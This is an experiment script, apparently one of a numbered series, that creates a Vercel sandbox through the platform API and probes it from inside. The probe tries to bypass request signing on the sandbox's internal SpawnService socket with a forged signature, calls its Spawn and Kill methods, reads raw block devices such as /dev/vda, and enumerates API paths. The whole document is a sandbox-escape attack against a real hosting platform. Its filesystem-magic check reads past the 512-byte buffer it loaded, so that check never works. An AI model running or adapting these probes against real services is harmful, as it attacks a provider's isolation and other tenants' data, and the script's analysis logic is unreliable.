# 实验J106: connect-go GET unary 签名绕过 + 直接读 /dev/vda 块设备 + API 版本路径枚举
import json, time, urllib.request, urllib.error, sys, base64
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

# --- [A] API 版本路径枚举 (本地) ---
print("== [A] API 版本路径 ==", flush=True)
for path in ["/v1/sandboxes", "/v3/sandboxes", "/sandboxes"]:
    c, r = api("GET", f"{path}?teamId={TEAM}&project={PROJ}")
    print(f"  GET {path} -> {c}: {r[:200]}", flush=True)

# --- [B] 沙箱内: GET unary + /dev/vda 直读 ---
NAME = "expj106"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("\ncreate:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

PROBE = r"""
import subprocess, base64, time, os

TS = str(int(time.time() * 1000))
SIG = base64.b64encode(b"\x99" * 64).decode()

def curl_get(path_query, sig=None):
    cmd = ["curl", "-sS", "-m", "6", "-i",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "x-timestamp: " + TS]
    if sig is not None:
        cmd += ["-H", "x-signature: " + SIG]
    cmd += ["http://localhost" + path_query]
    try:
        r = subprocess.run(cmd, capture_output=True, timeout=10)
        return (r.stdout + r.stderr).decode(errors="replace")[:300].replace("\r\n", " | ")
    except Exception as e:
        return f"EXC({e})"

print("== [B1] connect-go GET unary ==", flush=True)
paths = [
    "/vercel.sandbox.spawn.v1.SpawnService/Ping",
    "/vercel.sandbox.spawn.v1.SpawnService/Ping?encoding=json&message=",
    "/vercel.sandbox.spawn.v1.SpawnService/Spawn?encoding=json&message=",
    "/vercel.sandbox.spawn.v1.SpawnService/SpawnInteractive?encoding=json&message=",
    "/vercel.sandbox.spawn.v1.SpawnService/Spawn?message=",
    "/vercel.sandbox.spawn.v1.SpawnService/Kill?message=",
]
for p in paths:
    print(f"  GET {p[:70]} -> {curl_get(p)}", flush=True)
print("  GET Ping+signature ->", curl_get(paths[0], True), flush=True)

print("== [B2] /dev/vda /dev/vdb 直读 ==", flush=True)
for dev in ["/dev/vda", "/dev/vdb", "/dev/vda1", "/dev/vda2"]:
    try:
        st = os.stat(dev)
        print(f"  {dev} EXISTS mode={oct(st.st_mode)} size={st.st_size} rdev={st.st_rdev}", flush=True)
    except Exception as e:
        print(f"  {dev} MISS ({e})", flush=True)
        continue
    try:
        with open(dev, "rb") as f:
            head = f.read(512)
        hexd = head[:32].hex()
        print(f"  {dev} READ OK first512 bytes, head32={hexd}", flush=True)
        # 尝试找 ext4/xfs magic
        for off in range(0, 512, 4):
            pass
        print(f"  magic@0x438: {head[0x438:0x43c].hex()} (xfs=58465342) magic@0x400:{head[0x400:0x404].hex()} (ext=53ef)", flush=True)
    except Exception as e:
        print(f"  {dev} READ FAIL ({e})", flush=True)

print("== [B3] ls /dev 全部块设备 ==", flush=True)
try:
    r = subprocess.run(["ls", "-la", "/dev/"], capture_output=True, timeout=5)
    print(r.stdout.decode(errors="replace")[:600], flush=True)
except Exception as e:
    print("EXC", e, flush=True)
"""
run_cmd(sid, PROBE, "get-unary-vda", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
